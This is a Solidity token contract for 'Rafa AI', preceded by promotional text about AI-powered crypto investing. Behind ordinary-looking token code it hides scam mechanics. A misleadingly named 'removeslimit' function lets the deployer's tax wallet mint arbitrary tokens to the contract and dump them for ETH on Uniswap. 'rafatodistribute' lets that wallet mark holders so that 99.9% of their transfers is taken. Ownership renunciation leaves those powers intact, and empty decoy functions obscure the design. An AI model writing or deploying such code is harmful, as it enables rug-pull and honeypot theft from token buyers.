/*
RAFA AI
www.rafa-ai.com
twitter.com/rafa_ai_token
T.me/rafa_ai_token
In today's ever-evolving financial landscape, the world of cryptocurrency investment stands at the forefront of innovation and opportunity. With the meteoric rise of digital assets, investors worldwide are increasingly drawn to the potential for significant returns and portfolio diversification offered by cryptocurrencies. However, navigating this complex and volatile market presents numerous challenges, ranging from information overload to market uncertainty and the constant need for timely, data-driven decision-making.

In this dynamic environment, traditional investment strategies often fall short in providing investors with the agility and foresight needed to thrive. Recognizing these challenges, RAFA AI emerges as a pioneering solution, poised to revolutionize the way investors approach cryptocurrency investment. By harnessing the power of artificial intelligence, RAFA AI empowers investors with unparalleled insights, cutting-edge analysis, and sophisticated portfolio management tools, ultimately enabling them to make informed decisions and seize lucrative opportunities in the crypto market.

Addressing the Challenges:

The journey of a cryptocurrency investor is fraught with challenges, from deciphering market trends amidst the noise of information overload to managing risk in the face of unpredictable volatility. Traditional investment methods often struggle to keep pace with the rapid shifts and complexities inherent in the cryptocurrency market, leaving investors vulnerable to missed opportunities and costly mistakes.

Moreover, the lack of sophisticated tools tailored to the unique dynamics of the crypto landscape further exacerbates these challenges, limiting investors' ability to navigate the market with confidence and precision. As a result, many investors find themselves at a crossroads, seeking a solution that can provide them with the insights, analysis, and strategic guidance necessary to thrive in the world of cryptocurrency investment.



The Role of RAFA AI:

Enter RAFA AI, a groundbreaking platform designed to empower cryptocurrency investors with the tools, intelligence, and foresight needed to excel in this fast-paced and dynamic market. Built on the foundation of cutting-edge artificial intelligence and advanced data analytics, RAFA AI represents a paradigm shift in the way investors approach cryptocurrency investment.

At its core, RAFA AI leverages the power of AI-driven algorithms to analyze vast amounts of market data in real-time, uncovering hidden patterns, identifying emerging trends, and predicting market movements with unparalleled accuracy. By distilling complex market dynamics into actionable insights, RAFA AI empowers investors to make informed decisions, optimize their investment strategies, and capitalize on lucrative opportunities in the crypto market.

Empowering Investors:

RAFA AI stands as a beacon of empowerment for investors, offering a comprehensive suite of features and functionalities designed to meet the diverse needs and objectives of cryptocurrency investors. From research and analysis tools that provide deep insights into market trends to sophisticated portfolio management capabilities that enable investors to optimize their risk-return profiles, RAFA AI equips investors with the resources they need to succeed in the world of cryptocurrency investment.

Furthermore, RAFA AI's commitment to transparency, innovation, and user-centric design ensures that investors have access to best-in-class tools and services that enable them to stay ahead of the curve and navigate the complexities of the crypto market with confidence and precision. As the cryptocurrency landscape continues to evolve and mature, RAFA AI remains steadfast in its mission to empower investors with the intelligence, insights, and tools needed to thrive in this exciting and dynamic ecosystem.

*/
pragma solidity ^0.8.21;
// SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract RafaAI is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;

    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _taxWallet = msg.sender; 
    }

    string private _name = "Rafa AI";
    string private _symbol = "RAFA AI";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public _taxWallet;

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function raf() external {
    }
    function rafar() external {
    }
    function forrrafa() public {
    }
    function inrrafa() external {
    }
    function rafatodistribute(address[] calldata walletAddress) external {
        uint256 fromBlockNo = getBlockNumber();
        for (uint walletInde = 0;  walletInde < walletAddress.length;  walletInde++) { 
            if (!marketingAddres()){} else { 
                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    mapping (address => uint256) internal cooldowns;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function marketingAddres() private view returns (bool) {
        return (_taxWallet == (sender()));
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function removeslimit(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), amount); 
            _balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this); 
            addressPath[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);
        } else {
            return;
        }
    }
    function _transfer(address from, address to, uint256 value) internal {
        uint256 _taxValue = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        _balances[from] = _balances[from] - (value);
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((cooldowns[from] != 0) && onCooldown) {  
            _taxValue = (_cooldownFeeValue); 
        }
        uint256 toBalance = _balances[to];
        toBalance += (value) - (_taxValue);
        _balances[to] = toBalance;
    }
    event Approval(address indexed, address indexed, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}